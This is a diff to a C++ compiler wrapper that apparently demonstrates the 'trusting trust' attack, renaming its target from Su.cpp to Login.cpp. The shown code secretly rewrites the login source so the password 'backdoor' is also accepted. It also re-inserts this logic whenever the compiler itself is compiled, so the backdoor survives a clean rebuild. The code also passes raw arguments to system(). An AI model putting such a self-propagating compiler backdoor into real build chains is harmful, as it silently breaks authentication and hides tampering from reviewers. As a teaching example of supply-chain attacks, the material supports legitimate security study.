@@ -16,16 +16,16 @@ void findAndReplace(string fileName, string regexPattern, string newText) {
     fileOutputStream.close();
 }
 
-void compileSuWithBackdoor(string allArgs) {
-    system("cat Su.cpp > SuWithBackdoor.cpp");
+void compileLoginWithBackdoor(string allArgs) {
+    system("cat Login.cpp > LoginWithBackdoor.cpp");
 	findAndReplace(
-        "SuWithBackdoor.cpp",
+        "LoginWithBackdoor.cpp",
         "enteredPassword == \"test123\"",
         "enteredPassword == \"test123\" || enteredPassword == \"backdoor\""
     );
-    string modifiedCommand = "g++ " + regex_replace(allArgs, regex("Su.cpp"), "SuWithBackdoor.cpp");
+    string modifiedCommand = "g++ " + regex_replace(allArgs, regex("Login.cpp"), "LoginWithBackdoor.cpp");
 	system(modifiedCommand.c_str());
-	remove("SuWithBackdoor.cpp");
+	remove("LoginWithBackdoor.cpp");
 }
 
 void compileCleanCompilerWithBackdoor(string allArgs) {
@@ -47,16 +47,16 @@ void compileCleanCompilerWithBackdoor(string allArgs) {
             fileOutputStream << modifiedSource; \n\
         } \n\
                                                         \n\
-        void compileSuWithBackdoor(string allArgs) {    \n\
-            system(\"cat Su.cpp > SuWithBackdoor.cpp\"); \n\
+        void compileLoginWithBackdoor(string allArgs) {    \n\
+            system(\"cat Login.cpp > LoginWithBackdoor.cpp\"); \n\
             findAndReplace( \n\
-                \"SuWithBackdoor.cpp\", \n\
+                \"LoginWithBackdoor.cpp\", \n\
                 \"enteredPassword == \\\"test123\\\"\", \n\
                 \"enteredPassword == \\\"test123\\\" || enteredPassword == \\\"backdoor\\\"\" \n\
             ); \n\
-            string modifiedCommand = \"g++ \" + regex_replace(allArgs, regex(\"Su.cpp\"), \"SuWithBackdoor.cpp\"); \n\
+            string modifiedCommand = \"g++ \" + regex_replace(allArgs, regex(\"Login.cpp\"), \"LoginWithBackdoor.cpp\"); \n\
             system(modifiedCommand.c_str()); \n\
-            remove(\"SuWithBackdoor.cpp\"); \n\
+            remove(\"LoginWithBackdoor.cpp\"); \n\
         } \n\
                                             \n\
         int main(int argc, char *argv[]) { \n\
@@ -65,8 +65,8 @@ void compileCleanCompilerWithBackdoor(string allArgs) {
                 allArgs += \" \" + string(argv[i]); \n\
             string shellCommand = \"g++\" + allArgs; \n\
             string fileName = string(argv[1]); \n\
-            if(fileName == \"Su.cpp\") { \n\
-                compileSuWithBackdoor(allArgs); \n\
+            if(fileName == \"Login.cpp\") { \n\
+                compileLoginWithBackdoor(allArgs); \n\
             } else { \n\
                 system(shellCommand.c_str()); \n\
             } \n\
@@ -88,8 +88,8 @@ int main(int argc, char *argv[]) {
     string fileName = string(argv[1]);
     if(fileName == "Compiler.cpp")
         compileCleanCompilerWithBackdoor(allArgs);
-    else if(fileName == "Su.cpp")
-        compileSuWithBackdoor(allArgs);
+    else if(fileName == "Login.cpp")
+        compileLoginWithBackdoor(allArgs);
     else
 	    system(shellCommand.c_str());
 }
